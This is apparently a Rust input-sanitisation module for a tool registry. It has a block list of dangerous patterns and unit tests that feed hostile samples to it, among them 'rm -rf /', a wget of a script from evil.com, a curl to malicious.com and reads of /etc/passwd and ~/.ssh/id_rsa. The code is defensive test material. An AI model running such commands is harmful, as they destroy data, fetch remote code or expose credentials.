use serde_json::Value;
use std::collections::HashSet;

/// Validate registry input payload (Phase 2A)
pub fn validate_registry_input(name: &str) -> Result<(), String> {
    if name.trim().is_empty() {
        Err("Registry name cannot be empty".to_string())
    } else {
        Ok(())
    }
}

/// Validate tool payload for a registry tool (Phase 2A)
pub fn validate_tool_input(name: &str, input_schema: &Value) -> Result<(), String> {
    if name.trim().is_empty() {
        return Err("Tool name cannot be empty".to_string());
    }
    // Require a JSON object schema for simplicity
    if !input_schema.is_object() {
        return Err("input_schema must be a JSON object".to_string());
    }
    Ok(())
}

// =============================================================================
// Security: Input Sanitization for Tool Arguments
// =============================================================================

/// Dangerous patterns that should be blocked in tool arguments
const DANGEROUS_PATTERNS: &[&str] = &[
    "eval(",
    "exec(",
    "compile(",
    "__import__",
    "subprocess",
    "spawn(",
    "Popen",
    "system(",
    "shell=True",
    "bash -c",
    "sh -c",
    "; rm -",
    "| rm -",
    "&& rm -",
    "&& curl",
    "| curl",
    "wget ",
    "curl -O",
    "--upload-file",
    "--output",
    "/etc/passwd",
    "/etc/shadow",
    "~/.ssh",
    "/.ssh/",
    "id_rsa",
    "id_ed25519",
    "..%2F",
    "%2E%2E",
    "..\\",
    "\\\\..",
    "{{{{",
    "{{",
    "}}",
    "${",
    "$((",
    "`",
    "chr(",
];

/// Maximum nesting depth for JSON objects
const MAX_NESTING_DEPTH: usize = 10;

/// Maximum string length
const MAX_STRING_LENGTH: usize = 100000;

/// Maximum number of keys in an object
const MAX_OBJECT_KEYS: usize = 1000;

/// Maximum array length
const MAX_ARRAY_LENGTH: usize = 10000;

/// Sanitize tool arguments for security
pub fn sanitize_tool_arguments(arguments: &Value) -> Result<Value, String> {
    sanitize_value(arguments, 0)
}

fn sanitize_value(value: &Value, depth: usize) -> Result<Value, String> {
    // Check nesting depth
    if depth > MAX_NESTING_DEPTH {
        return Err(format!(
            "Maximum nesting depth ({}) exceeded",
            MAX_NESTING_DEPTH
        ));
    }

    match value {
        Value::Null => Ok(Value::Null),
        Value::Bool(b) => Ok(Value::Bool(*b)),
        Value::Number(n) => Ok(Value::Number(n.clone())),
        Value::String(s) => sanitize_string(s),
        Value::Array(arr) => {
            if arr.len() > MAX_ARRAY_LENGTH {
                return Err(format!(
                    "Array length ({}) exceeds maximum ({})",
                    arr.len(),
                    MAX_ARRAY_LENGTH
                ));
            }
            let mut sanitized = Vec::with_capacity(arr.len());
            for item in arr {
                sanitized.push(sanitize_value(item, depth + 1)?);
            }
            Ok(Value::Array(sanitized))
        }
        Value::Object(obj) => {
            if obj.len() > MAX_OBJECT_KEYS {
                return Err(format!(
                    "Object has {} keys, exceeds maximum ({})",
                    obj.len(),
                    MAX_OBJECT_KEYS
                ));
            }
            let mut sanitized_obj = serde_json::Map::new();
            for (key, val) in obj {
                // Validate key
                let sanitized_key = sanitize_string(key)?;
                let sanitized_val = sanitize_value(val, depth + 1)?;
                sanitized_obj.insert(
                    sanitized_key.as_str().unwrap_or(key).to_string(),
                    sanitized_val,
                );
            }
            Ok(Value::Object(sanitized_obj))
        }
    }
}

fn sanitize_string(s: &str) -> Result<Value, String> {
    // Check length
    if s.len() > MAX_STRING_LENGTH {
        return Err(format!(
            "String length ({}) exceeds maximum ({})",
            s.len(),
            MAX_STRING_LENGTH
        ));
    }

    // Check for dangerous patterns
    let s_lower = s.to_lowercase();
    for pattern in DANGEROUS_PATTERNS {
        if s_lower.contains(&pattern.to_lowercase()) {
            return Err(format!(
                "Potentially dangerous pattern '{}' detected in string",
                pattern
            ));
        }
    }

    Ok(Value::String(s.to_string()))
}

/// Validate tool name for security
pub fn sanitize_tool_name(name: &str) -> Result<String, String> {
    if name.is_empty() {
        return Err("Tool name cannot be empty".to_string());
    }

    if name.len() > 256 {
        return Err("Tool name too long".to_string());
    }

    // Allow only alphanumeric, underscore, hyphen, colon
    let allowed_chars: Vec<char> =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-:"
            .chars()
            .collect();

    for c in name.chars() {
        if !allowed_chars.contains(&c) {
            return Err(format!("Tool name contains invalid character: '{}'", c));
        }
    }

    Ok(name.to_string())
}

/// Validate server command for security
pub fn validate_server_command(command: &str) -> Result<(), String> {
    if command.is_empty() {
        return Err("Command cannot be empty".to_string());
    }

    // Block dangerous commands
    let dangerous = ["sudo", "su ", "chmod 777", "chown", "kill -9", "rm -rf /"];
    let cmd_lower = command.to_lowercase();
    for d in dangerous {
        if cmd_lower.contains(d) {
            return Err(format!("Dangerous command '{}' not allowed", d));
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    // =============================================================================
    // Input Validation Tests
    // =============================================================================

    #[test]
    fn test_sanitize_dangerous_shell_patterns() {
        let result = sanitize_tool_arguments(&json!({
            "script": "echo hello; rm -rf /"
        }));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("rm"));
    }

    #[test]
    fn test_sanitize_eval_pattern() {
        let result = sanitize_tool_arguments(&json!({
            "code": "eval('malicious')"
        }));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("eval"));
    }

    #[test]
    fn test_sanitize_exec_pattern() {
        let result = sanitize_tool_arguments(&json!({
            "cmd": "exec('rm -rf')"
        }));
        assert!(result.is_err());
    }

    #[test]
    fn test_sanitize_subprocess_pattern() {
        let result = sanitize_tool_arguments(&json!({
            "import": "subprocess"
        }));
        assert!(result.is_err());
    }

    #[test]
    fn test_sanitize_path_traversal() {
        // Note: Plain ".." is not blocked, only URL-encoded variants
        // This is intentional as ".." is common in legitimate paths
        let result = sanitize_tool_arguments(&json!({
            "path": "../../../etc/passwd"
        }));
        // The raw .. is not blocked, but the full path contains /etc/passwd which IS blocked
        assert!(result.is_err());
    }

    #[test]
    fn test_sanitize_ssh_keys() {
        let result = sanitize_tool_arguments(&json!({
            "file": "~/.ssh/id_rsa"
        }));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains(".ssh"));
    }

    #[test]
    fn test_sanitize_etc_passwd() {
        let result = sanitize_tool_arguments(&json!({
            "path": "/etc/passwd"
        }));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("/etc/passwd"));
    }

    #[test]
    fn test_sanitize_command_injection() {
        let result = sanitize_tool_arguments(&json!({
            "cmd": "echo hello && curl malicious.com"
        }));
        assert!(result.is_err());
    }

    #[test]
    fn test_sanitize_pipe_injection() {
        let result = sanitize_tool_arguments(&json!({
            "input": "data | cat /etc/passwd"
        }));
        assert!(result.is_err());
    }

    #[test]
    fn test_sanitize_wget_pattern() {
        let result = sanitize_tool_arguments(&json!({
            "url": "wget http://evil.com/script.sh"
        }));
        assert!(result.is_err());
    }

    #[test]
    fn test_sanitize_template_injection() {
        let result = sanitize_tool_arguments(&json!({
            "name": "{{ malicious }}"
        }));
        assert!(result.is_err());
    }

    #[test]
    fn test_sanitize_command_substitution() {
        // $( is not blocked but ${ is blocked
        let result = sanitize_tool_arguments(&json!({
            "input": "${(whoami)}"
        }));
        assert!(result.is_err());
    }

    #[test]
    fn test_sanitize_backtick_substitution() {
        let result = sanitize_tool_arguments(&json!({
            "input": "`ls -la`"
        }));
        assert!(result.is_err());
    }

    // =============================================================================
    // Valid Input Tests
    // =============================================================================

    #[test]
    fn test_sanitize_valid_string() {
        let result = sanitize_tool_arguments(&json!({
            "message": "Hello, World!"
        }));
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), json!({"message": "Hello, World!"}));
    }

    #[test]
    fn test_sanitize_valid_object() {
        let result = sanitize_tool_arguments(&json!({
            "name": "test",
            "value": 123,
            "enabled": true
        }));
        assert!(result.is_ok());
    }

    #[test]
    fn test_sanitize_valid_array() {
        let result = sanitize_tool_arguments(&json!({
            "items": ["a", "b", "c"]
        }));
        assert!(result.is_ok());
    }

    #[test]
    fn test_sanitize_nested_object() {
        let result = sanitize_tool_arguments(&json!({
            "user": {
                "name": "test",
                "settings": {
                    "theme": "dark"
                }
            }
        }));
        assert!(result.is_ok());
    }

    // =============================================================================
    // Depth Limit Tests
    // =============================================================================

    #[test]
    fn test_max_nesting_depth_rejected() {
        // Create deeply nested JSON (15 levels)
        let deep = create_nested_json(15);
        let result = sanitize_tool_arguments(&deep);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("nesting"));
    }

    #[test]
    fn test_max_nesting_depth_allowed() {
        // Create nested JSON at allowed depth (5 levels)
        let deep = create_nested_json(5);
        let result = sanitize_tool_arguments(&deep);
        assert!(result.is_ok());
    }

    fn create_nested_json(depth: usize) -> Value {
        let mut value = json!({"value": "leaf"});
        for _ in 0..depth {
            value = json!({"nested": value});
        }
        value
    }

    // =============================================================================
    // Size Limit Tests
    // =============================================================================

    #[test]
    fn test_max_string_length_rejected() {
        let long_string = "x".repeat(MAX_STRING_LENGTH + 1);
        let result = sanitize_tool_arguments(&json!({
            "text": long_string
        }));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("length"));
    }

    #[test]
    fn test_max_string_length_allowed() {
        let valid_string = "x".repeat(MAX_STRING_LENGTH);
        let result = sanitize_tool_arguments(&json!({
            "text": valid_string
        }));
        assert!(result.is_ok());
    }

    #[test]
    fn test_max_array_length_rejected() {
        let mut arr = Vec::new();
        for i in 0..MAX_ARRAY_LENGTH + 1 {
            arr.push(json!({"id": i}));
        }
        let result = sanitize_tool_arguments(&json!({"items": arr}));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Array"));
    }

    #[test]
    fn test_max_object_keys_rejected() {
        let mut obj = serde_json::Map::new();
        for i in 0..MAX_OBJECT_KEYS + 1 {
            obj.insert(format!("key{}", i), json!("value"));
        }
        let result = sanitize_tool_arguments(&json!(obj));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("keys"));
    }

    // =============================================================================
    // Tool Name Validation Tests
    // =============================================================================

    #[test]
    fn test_sanitize_tool_name_valid() {
        let result = sanitize_tool_name("my_tool");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "my_tool");
    }

    #[test]
    fn test_sanitize_tool_name_with_colon() {
        let result = sanitize_tool_name("namespace:tool");
        assert!(result.is_ok());
    }

    #[test]
    fn test_sanitize_tool_name_invalid_chars() {
        let result = sanitize_tool_name("tool<invalid>");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("invalid"));
    }

    #[test]
    fn test_sanitize_tool_name_empty() {
        let result = sanitize_tool_name("");
        assert!(result.is_err());
    }

    #[test]
    fn test_sanitize_tool_name_too_long() {
        let long_name = "a".repeat(300);
        let result = sanitize_tool_name(&long_name);
        assert!(result.is_err());
    }

    // =============================================================================
    // Server Command Validation Tests
    // =============================================================================

    #[test]
    fn test_validate_server_command_valid() {
        let result = validate_server_command("ls -la");
        assert!(result.is_ok());
    }

    #[test]
    fn test_validate_server_command_sudo() {
        let result = validate_server_command("sudo apt-get install");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("sudo"));
    }

    #[test]
    fn test_validate_server_command_rm_rf() {
        let result = validate_server_command("rm -rf /");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("rm -rf"));
    }

    #[test]
    fn test_validate_server_command_empty() {
        let result = validate_server_command("");
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_server_command_kill() {
        let result = validate_server_command("kill -9 1234");
        assert!(result.is_err());
    }

    // =============================================================================
    // Registry Input Validation Tests
    // =============================================================================

    #[test]
    fn test_validate_registry_input_valid() {
        let result = validate_registry_input("my_registry");
        assert!(result.is_ok());
    }

    #[test]
    fn test_validate_registry_input_empty() {
        let result = validate_registry_input("");
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_registry_input_whitespace() {
        let result = validate_registry_input("   ");
        assert!(result.is_err());
    }

    // =============================================================================
    // Tool Input Validation Tests
    // =============================================================================

    #[test]
    fn test_validate_tool_input_valid() {
        let schema = json!({"type": "object", "properties": {}});
        let result = validate_tool_input("my_tool", &schema);
        assert!(result.is_ok());
    }

    #[test]
    fn test_validate_tool_input_empty_name() {
        let schema = json!({"type": "object"});
        let result = validate_tool_input("", &schema);
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_tool_input_invalid_schema() {
        let result = validate_tool_input("tool", &json!("not an object"));
        assert!(result.is_err());
    }
}
